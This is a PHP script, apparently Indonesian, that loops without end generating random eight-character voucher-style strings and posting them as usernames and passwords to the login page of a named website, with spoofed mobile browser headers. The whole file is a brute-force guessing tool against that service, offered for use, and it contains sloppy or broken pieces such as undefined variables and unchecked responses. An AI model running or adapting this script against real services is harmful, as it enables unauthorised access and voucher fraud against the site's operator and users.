<?php
error_reporting(0);
function acak($panjang)
    {
        $karakter= 'abcdefghijklmnopqrstuvwxyz';
        $string = '';
        for ($i = 0; $i < $panjang; $i++) {
      $pos = rand(0, strlen($karakter)-1);
      $string .= $karakter{$pos};
        }
        return $string;
    }

function randomString($length)
    {
        $str        = "";
        $characters = '1234567890';
        $max        = strlen($characters) - 1;
        for ($i = 0; $i < $length; $i++) {
            $rand = mt_rand(0, $max);
            $str .= $characters[$rand];
        }
        return $str;
    }
            
date_default_timezone_set("Asia/JAKARTA"); 
while(true)
{
// ACAK Voucher Sesuai Format == Lanjut Besok

echo "Voucher= ".$hasil_1= acak(4)."".randomString(4)."
";



$url       = 'http://giyatsamedia.com/login';

$headers   = array(
'POST /login HTTP/1.1',
'Host: giyatsamedia.com',
'Connection: keep-alive',
'Cache-Control: max-age=0',
'Origin: http://giyatsamedia.com',
'Upgrade-Insecure-Requests: 1',
'Content-Type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; 2014812) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
'Referer: http://giyatsamedia.com/login',
'Accept-Encoding: gzip, deflate',
'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',);


$post   = "username=".$hasil_1= acak(4)."".randomString(4)."&password=".$hasil_1= acak(4)."".randomString(4).""; 
$post      = json_decode(yarzCurl($url, $post, false, $headers, true));
}


    
print ' prosessss'; die();
function yarzCurl($url, $fields = false, $cookie = false, $httpheader = false, $encoding = false)

{
   

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    if ($fields !== false) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
    }
    if ($encoding !== false) {
        curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
    }
    if ($cookie !== false) {
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
    }
    if ($httpheader !== false) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, $httpheader);
    }
    if (file_exists($file)) {
      $counter += file_get_contents($file);
      
    }
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}
